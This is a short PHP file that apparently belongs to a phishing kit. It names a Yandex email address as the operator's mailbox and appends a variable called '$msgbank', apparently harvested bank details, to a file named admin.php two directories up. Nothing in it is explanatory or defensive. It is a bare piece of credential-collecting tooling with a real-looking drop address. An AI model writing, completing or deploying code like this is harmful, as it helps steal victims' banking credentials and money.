<?php
$yourmail  = "afteralso45@yandex.com";

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>